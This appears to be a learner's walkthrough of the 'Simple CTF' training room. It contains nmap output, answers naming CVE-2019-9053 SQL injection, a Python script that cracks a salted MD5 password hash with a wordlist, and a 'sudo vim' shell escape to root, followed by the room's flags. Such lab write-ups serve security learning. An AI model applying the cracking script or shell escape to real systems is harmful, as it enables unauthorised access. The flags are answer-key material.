# Simple CTF

**Notes**
```
# Nmap 7.80 scan initiated Mon Apr  5 11:25:51 2021 as: nmap -sC -sV -vv -oN nmap_scan 10.10.149.143
Nmap scan report for 10.10.149.143
Host is up, received syn-ack (0.038s latency).
Scanned at 2021-04-05 11:25:52 BST for 41s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.32.89
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  5 11:26:33 2021 -- 1 IP address (1 host up) scanned in 41.98 seconds
```

**Questions**

    1. How many services are running under port 1000?

2

    2. What is running on the higher port?

SSH

    3. What is running on the higher port?

CVE-2019-9053

    4. To what kind of vulnerability is the application vulnerable?

SQLI

    5. What's the password?

secret

This question was a total disaster for me. Regardless of how I modified the exploit I could not get it to execute correctly. It would not perform the final password cracking stage.

At this time I had the salt and the hash, which I was able to throw into hashcat in order to get the correct password.

This wasn't enough for me, so knowing what the correct password was, I was able to create a python script to complete the final stage of the exploit for me.

```python
#!/usr/bin/env python3

import hashlib
import sys

f = open(sys.argv[1],'r',encoding='utf-8')
contents = f.readlines()
salt='1dac0d92e9fa6bb2'
password='0c01f4468bd75d7a84c7eb73846e8d96'

#count=0
#contents=salt+contents
for line in contents:
    line2 = salt+line
    line2 = line2.strip()
    #if hashlib.md5(str(salt) + line).hexdigest() == password:
    possible_pass = hashlib.md5(line2.encode())
    if possible_pass.hexdigest() == password:
        print("Password Cracked: " + line)
        break
```

I highly doubt this is the most optimised way of doing things but it doesn't matter, it was able to trawl through the rockyou dictionary in about 10 seconds (I tested this by removing secret and placing it at the end of the wordlist).

Using my new knowledge, I was able to fix the original exploit given in order to return the password the way that was intended.

    6. Where can you login with the details obtained?

SSH

    7. What's the user flag?

G00d j0b, keep up!

    8. Is there any other user in the home directory? What's its name?

sunbath

    9. What can you leverage to spawn a privileged shell?

vim

`sudo vim -c ':!/bin/bash'`.


    10. What's the root flag?

W3ll d0n3. You made it!